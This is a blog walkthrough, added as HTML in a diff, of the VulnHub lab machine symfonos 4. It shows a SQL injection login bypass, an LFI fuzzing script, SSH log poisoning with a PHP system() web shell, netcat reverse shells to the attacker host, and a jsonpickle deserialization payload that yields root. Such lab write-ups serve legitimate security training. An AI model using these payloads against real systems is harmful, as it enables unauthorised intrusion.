@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - symfonos 4
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - symfonos 4" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder." />
+<meta property="og:description" content="Description: OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder." />
+<link rel="canonical" href="http://localhost:4000/symfonos4.html" />
+<meta property="og:url" content="http://localhost:4000/symfonos4.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/symfonos4.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/symfonos4.html" />
+<meta property="twitter:title" content="VulnHub - symfonos 4" />
+<script type="application/ld+json">
+{"headline":"VulnHub - symfonos 4","dateModified":"2021-06-25T00:00:00-05:00","datePublished":"2021-06-25T00:00:00-05:00","url":"http://localhost:4000/symfonos4.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/symfonos4.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - symfonos 4</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>June 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder.</p>
+
+<p><strong>Author:</strong> Zayotic</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/symfonos-4,347/">https://www.vulnhub.com/entry/symfonos-4,347/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>We start by discovering our target machine with <strong>arp-scan</strong>, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.138 08:00:27:79:ce:89       PCS Systemtechnik GmbH
+192.168.179.254 00:50:56:f5:4d:f3       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Discovered the IP address of our target, I proceed to perform a full TCP scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p-</span> 192.168.179.138 <span class="nt">-oG</span> tcp-all-ports.txt
+...
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 08:00:27:79:CE:89 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="sevice-enumeration">Sevice Enumeration</h3>
+<p>Then proceed to enumerate the TCP open ports versions and services with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p22</span>,80 192.168.179.138 <span class="nt">-oN</span> nmap-service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f <span class="o">(</span>RSA<span class="o">)</span>
+|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Browsing the web page I didn’t find anything, so I run gobuster to find directories and files using brute force.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.138/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> txt,html,php
+...
+http://192.168.179.138/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 201]
+http://192.168.179.138/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/css/]
+http://192.168.179.138/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/manual/]
+http://192.168.179.138/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/js/]    
+http://192.168.179.138/javascript           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 323] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/javascript/]
+http://192.168.179.138/robots.txt           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]                                         
+http://192.168.179.138/sea.php              <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> atlantis.php]                        
+http://192.168.179.138/atlantis.php         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1718]                                        
+http://192.168.179.138/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]                                         
+http://192.168.179.138/gods                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/gods/]
+...
+</code></pre></div></div>
+<p>In the output we can see the <strong>atlantis.php</strong> file this contains a login page.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-2.png" alt="" /></p>
+
+<p><strong>SQL Injection to Bypass Authentication</strong></p>
+
+<p>Testing the web form I found that it’s vulnerable to SQL Injection, so I bypassed the login page with the following SQL statement:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/symfonos4/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/symfonos4/screenshot-4.png" alt="" /></p>
+
+<p>This page allows us request for a god and returns a description about it, if we remember in the gobuster results we found the directory <strong>gods</strong>, this contains the gods that are being included in the web page.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-5.png" alt="" /></p>
+
+<p><strong>Local File Inclusion</strong></p>
+
+<p>If we notice that the <strong>.log</strong> extension is not included at the time of requesting a god, so I decided to test Local File Inclusion vulnerability, but removing the .log extension from the word list, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="s1">'s/\.log$//g'</span> /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt <span class="o">&gt;</span> wordlist.txt
+</code></pre></div></div>
+<p>Therefore I decided develop a python script, which will help me find a file that can be included in the parameter <strong>file</strong>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">target</span><span class="o">=</span><span class="s">"http://192.168.179.138/atlantis.php"</span>
+<span class="n">payload</span><span class="o">=</span><span class="s">"' or 1=1 #"</span>
+<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">values</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'username'</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
+            <span class="s">'password'</span><span class="p">:</span><span class="s">'password'</span>
+            <span class="p">}</span>
+
+    <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">values</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">lfi_fuzz</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="n">lfi_req</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"http://192.168.179.138/sea.php?file=../../../../../../</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">lfi_req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"wordlist.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">sqli</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="n">x</span><span class="o">=</span><span class="n">lfi_fuzz</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">x</span> <span class="o">!=</span> <span class="mi">577</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">p</span><span class="p">:</span><span class="mi">50</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">p</span><span class="p">:</span><span class="mi">50</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Then we run our script and we can see that the ssh log file is possible to include.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 lfi.py
+4706 /var/log/auth                                     
+274347 /var/log/dpkg
+</code></pre></div></div>
+
+<p><img src="/assets/images/symfonos4/screenshot-6.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="ssh-log-poisoning">SSH Log Poisoning</h3>
+<p>This is a technique that allows the attacker to inject malicious code into the ssh registry, keeping this in mind, we inject the system function as username, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> <span class="s1">'&lt;?php system($_GET[cmd]); ?&gt;'</span> 192.168.179.138
+&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>cmd]<span class="o">)</span><span class="p">;</span> ?&gt;@192.168.179.138<span class="s1">'s password:
+</span></code></pre></div></div>
+<p>With curl we’ll try to request the ssh log but adding as parameter a system command, in this case we can see that the commad <strong>id</strong> is executed correctly, then we verify that netcat exists and thus obtain a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-X</span> POST <span class="nt">-c</span> cookies_file.txt <span class="s2">"http://192.168.179.138/atlantis.php"</span> <span class="nt">--data</span> <span class="s2">"username=admin'+or+1%3d1+%23&amp;password=password"</span> 
+
+root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookies_file.txt <span class="s2">"http://192.168.179.138/sea.php?file=../../../../../../../var/log/auth&amp;cmd=id"</span> | html2text <span class="nt">-width</span> 90 | <span class="nb">tail</span> <span class="nt">-2</span>
+<span class="k">for </span>invalid user <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> from 192.168.179.1
+port 38056 ssh2
+
+root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookies_file.txt <span class="s2">"http://192.168.179.138/sea.php?file=../../../../../../../var/log/auth&amp;cmd=whereis%20nc"</span> | html2text <span class="nt">-width</span> 90 | <span class="nb">tail</span> <span class="nt">-2</span> 
+password <span class="k">for </span>invalid user nc: /usr/bin/nc.traditional /usr/bin/nc /usr/share/man/man1/
+nc.1.gz from 192.168.179.1 port 38056 ssh2
+</code></pre></div></div>
+
+<p><strong>Getting a reverse shell</strong></p>
+
+<p>First we set up a netcat listener on port 443, and then we run the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookies_file.txt <span class="s2">"http://192.168.179.138/sea.php?file=../../../../../../../var/log/auth&amp;cmd=nc%20192.168.179.1%20443%20-e%20/bin/bash"</span> | html2text <span class="nt">-width</span> 90 | <span class="nb">tail</span> <span class="nt">-2</span>
+</code></pre></div></div>
+
+<p>As we can see, we get a reverse shell with limited permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.138] 46544
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@symfonos4:/var/www/html<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+<span class="nb">uname</span> <span class="nt">-a</span>
+Linux symfonos4 4.19.0-5-686 <span class="c">#1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686 GNU/Linux</span>
+</code></pre></div></div>
+
+<p><strong>Enumerating Services</strong></p>
+
+<p>In the obtained result we see that the port 3306 belonging to MySQL and the port 8080 possibly a web application are running locally.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@symfonos4:/<span class="nv">$ </span>ss <span class="nt">-antl</span>
+State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
+LISTEN    0         80               127.0.0.1:3306             0.0.0.0:<span class="k">*</span>       
+LISTEN    0         128              127.0.0.1:8080             0.0.0.0:<span class="k">*</span>       
+LISTEN    0         128                0.0.0.0:22               0.0.0.0:<span class="k">*</span>       
+LISTEN    0         128                      <span class="k">*</span>:80                     <span class="k">*</span>:<span class="k">*</span>       
+LISTEN    0         128                   <span class="o">[</span>::]:22                  <span class="o">[</span>::]:<span class="k">*</span>
+</code></pre></div></div>
+
+<p><strong>MySQL credentials</strong></p>
+
+<p>The <strong>atlantis.php</strong> file located in the document root I found the MySQL credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@symfonos4:/var/www/html<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-n</span> 5 atlantis.php
+&lt;?php
+   define<span class="o">(</span><span class="s1">'DB_USERNAME'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>
+   define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'yVzyRGw3cG2Uyt2r'</span><span class="o">)</span><span class="p">;</span>
+   <span class="nv">$db</span> <span class="o">=</span> new PDO<span class="o">(</span><span class="s2">"mysql:host=localhost:3306;dbname=db"</span>, DB_USERNAME,DB_PASSWORD<span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>With the MySQL password I switch to poseidon user as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@symfonos4:/var/www/html<span class="nv">$ </span>su poseidon
+Password: yVzyRGw3cG2Uyt2r
+
+poseidon@symfonos4:/var/www/html<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>poseidon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>poseidon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>poseidon<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>bluetooth<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>Enumerating running Processes</strong></p>
+
+<p>Listing the processes, I found the service on port 8080 is running with root permissions, this is interesting because we could escalate our privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poseidon@symfonos4:/var/www/html<span class="nv">$ </span>ps aux | <span class="nb">grep </span>root
+...
+root       559  0.5  3.4  28264 17704 ?        S    19:37   1:01 /usr/bin/python /usr/local/bin/gunicorn <span class="nt">--workers</span> 3 <span class="nt">-b</span> 127.0.0.1:8080 app:app
+...
+</code></pre></div></div>
+
+<h3 id="local-port-forwarding">Local Port Forwarding</h3>
+
+<p>Then I performed a local port forwarding, this means that all data sent to port 4444 on attacking machine is forwarded to port 8080 on target host, as shown below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 4444:127.0.0.1:8080 <span class="nt">-l</span> poseidon 192.168.179.138
+
+root@kali:~<span class="nv">$ </span>ss <span class="nt">-antl</span> | <span class="nb">grep </span>4444
+LISTEN 0      128        127.0.0.1:4444      0.0.0.0:<span class="k">*</span>          
+LISTEN 0      128            <span class="o">[</span>::1]:4444         <span class="o">[</span>::]:<span class="k">*</span> 
+</code></pre></div></div>
+
+<p>Poked around the web page and found nothing interesting, I went to the system to locate the web application that is running locally on port 8080 on the target machine.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-7.png" alt="" /></p>
+
+<p><img src="/assets/images/symfonos4/screenshot-8.png" alt="" /></p>
+
+<p>In the <strong>/opt/code</strong> directory I found some python files, reviewing the <strong>app.py</strong> file I identify that it’s importing the <strong>jsonpickle</strong> module.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poseidon@symfonos4:/opt/code<span class="nv">$ </span><span class="nb">ls
+</span>app.py  app.pyc  static  templates  wsgi.pyc
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poseidon@symfonos4:/opt/code<span class="nv">$ </span><span class="nb">cat </span>app.py
+from flask import Flask, request, render_template, current_app, redirect
+
+import jsonpickle
+import <span class="nb">base64
+
+</span>app <span class="o">=</span> Flask<span class="o">(</span>__name__<span class="o">)</span>
+
+class User<span class="o">(</span>object<span class="o">)</span>:
+
+    def __init__<span class="o">(</span>self, username<span class="o">)</span>:
+        self.username <span class="o">=</span> username
+
+
+@app.route<span class="o">(</span><span class="s1">'/'</span><span class="o">)</span>
+def index<span class="o">()</span>:
+    <span class="k">if </span>request.cookies.get<span class="o">(</span><span class="s2">"username"</span><span class="o">)</span>:
+        u <span class="o">=</span> jsonpickle.decode<span class="o">(</span>base64.b64decode<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s2">"username"</span><span class="o">)))</span>
+        <span class="k">return </span>render_template<span class="o">(</span><span class="s2">"index.html"</span>, <span class="nv">username</span><span class="o">=</span>u.username<span class="o">)</span>
+    <span class="k">else</span>:
+        w <span class="o">=</span> redirect<span class="o">(</span><span class="s2">"/whoami"</span><span class="o">)</span>
+        response <span class="o">=</span> current_app.make_response<span class="o">(</span>w<span class="o">)</span>
+        u <span class="o">=</span> User<span class="o">(</span><span class="s2">"Poseidon"</span><span class="o">)</span>
+        encoded <span class="o">=</span> base64.b64encode<span class="o">(</span>jsonpickle.encode<span class="o">(</span>u<span class="o">))</span>
+        response.set_cookie<span class="o">(</span><span class="s2">"username"</span>, <span class="nv">value</span><span class="o">=</span>encoded<span class="o">)</span>
+        <span class="k">return </span>response
+
+
+@app.route<span class="o">(</span><span class="s1">'/whoami'</span><span class="o">)</span>
+def <span class="nb">whoami</span><span class="o">()</span>:
+    user <span class="o">=</span> jsonpickle.decode<span class="o">(</span>base64.b64decode<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s2">"username"</span><span class="o">)))</span>
+    username <span class="o">=</span> user.username
+    <span class="k">return </span>render_template<span class="o">(</span><span class="s2">"whoami.html"</span>, <span class="nv">username</span><span class="o">=</span>username<span class="o">)</span>
+
+
+<span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
+    app.run<span class="o">()</span>
+</code></pre></div></div>
+
+<p>Searching for vulnerabilities with searchsploit, I found that the <strong>jsonpickle</strong> module is vulnerable to Remote Code Execution, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit jsonpickle                 
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------</span>
+ Exploit Title                                              |  Path
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------</span>
+python jsonpickle 2.0.0 - Remote Code Execution             | multiple/remote/49585.py
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------</span>
+</code></pre></div></div>
+<p>We transfer a copy of the exploit to our current directory, and we analyze the proof of concept to exploit this vulnerability, this security flaw consists if malicious data is deserialized, it will execute arbitrary Python commands, the problem is in the inner function loadrepr function which eval each serialized string which contains “py/repr”, to know more obout this vulnerability you can find it <a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> multiple/remote/49585.py
+
+
+root@kali:~<span class="nv">$ </span><span class="nb">cat </span>49585.py
+...
+<span class="c">#       the pattern should be :</span>
+<span class="c">#       {..{"py/repr":&lt;the module to import&gt;/&lt;the command to be executed.&gt;}..}</span>
+
+<span class="c">#       example:</span>
+
+malicious <span class="o">=</span> <span class="s1">'{"1": {"py/repr": "time/time.sleep(10)"}, "2": {"py/id": 67}}'</span>
+...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="jsonpickle-module">Jsonpickle Module</h3>
+
+<p>First we intercept the web page request, and send it to repeater.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-9.png" alt="" /></p>
+
+<p><img src="/assets/images/symfonos4/screenshot-10.png" alt="" />
+If we notice the cookie value is encoded in base64, we decode it and see that the data is in json format.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-11.png" alt="" /></p>
+
+<p>Then we modify the data slightly according to the specifications of the proof of concept, we import the os module and then we use the system method to execute commands from the system, in this case the netcat utility to obtain a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">username</span><span class="o">={</span><span class="s2">"py/object"</span>: <span class="s2">"app.User"</span>, <span class="s2">"py/repr"</span>:<span class="s2">"os/os.system(</span><span class="se">\"</span><span class="s2">nc 192.168.179.1 443 -c bash</span><span class="se">\"</span><span class="s2">)"</span><span class="o">}</span>
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos4/screenshot-12.png" alt="" /></p>
+
+<p>After we return to encode the data in base64, set up a netcat listener and finally sent the request.</p>
+
+<p><img src="/assets/images/symfonos4/screenshot-13.png" alt="" /></p>
+
+<p>As we can see we get a shell with root privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.138] 58344
+<span class="nb">uname</span> <span class="nt">-a</span>
+Linux symfonos4 4.19.0-5-686 <span class="c">#1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686 GNU/Linux</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
